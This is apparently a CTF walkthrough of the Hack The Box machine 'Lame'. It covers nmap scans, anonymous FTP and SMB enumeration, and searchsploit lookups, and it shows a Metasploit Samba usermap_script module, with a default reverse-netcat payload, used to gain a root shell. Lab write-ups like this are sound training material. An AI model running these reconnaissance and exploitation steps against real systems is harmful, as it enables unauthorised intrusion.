### nmap

```Bash
# port
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

```

```Bash
#service ftp可以匿名登录 smb协议开启，定位到ftp和smb上
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

```



### ftp - rabbit hole

```Bash
# ftp匿名登录后目录为空
walle@walle:~$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:walle): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
ftp> ls
229 Entering Extended Passive Mode (|||6070|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> dir
229 Entering Extended Passive Mode (|||64932|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -a
229 Entering Extended Passive Mode (|||56779|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..


# nse脚本探测
walle@walle:~/machines/linux/lame$ sudo nmap --script "ftp*" -p21 10.10.10.3

# searchexploit有版本直接命中，纯脚本跑不起来，用msf无法拿到backdoor，放弃。
walle@walle:~/machines/linux/lame$ searchsploit vsftpd
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                           | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                           | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                           | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                         | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                   | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                  | multiple/remote/49719.py


```



### smb

```Bash
# smbclient
walle@walle:~/machines/linux/lame$ smbclient -L 10.10.10.3
Password for [WORKGROUP\walle]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME



# searchexploit，找到msf的exp，直接拿到root shell，实际生效端口为139。
└─# searchsploit samba | grep  3.0.20
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)         | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                        

msf6 >  use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat


```



### beyond root

github 搜索CVE-2011-2523，别人写的exp都需要用户名密码，没有发现可以成功的

github搜索CVE-2007-2447, 有运行成功的脚本，但是拿不到shell

通过msf的shell进去后没有发现有ftp用户信息配置，ftp应该是不可用的。





